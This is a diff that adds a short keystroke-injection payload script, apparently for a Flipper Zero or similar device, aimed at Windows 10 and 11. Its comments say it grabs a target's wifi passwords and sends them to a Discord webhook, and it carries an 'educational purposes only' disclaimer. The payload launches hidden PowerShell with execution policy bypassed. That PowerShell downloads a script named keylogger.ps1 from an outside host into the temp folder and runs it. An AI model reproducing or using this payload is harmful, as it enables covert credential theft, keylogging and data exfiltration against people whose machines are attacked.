@@ -1,0 +1,9 @@
+REM     Description: This payload grabs your target's wifi passwords and uploads them to Discord.
+REM     To Get Discord Web URL Please visit https://github.com/wmlsandaruwan/
+REM     This script is for educational purposes only
+REM     Target: Windows 10, 11
+
+DELAY 2000
+GUI r
+DELAY 250
+STRINGLN powershell -w h -ep bypass $discord = '<your_webhook_here>' Invoke-WebRequest -Uri 'https://link.wmlsandaruwan.online/FlipperZeroKeylogger' -OutFile "$env:TEMP\keylogger.ps1" powershell.exe -ExecutionPolicy Bypass -File "$env:TEMP\keylogger.ps1" -discord $discord
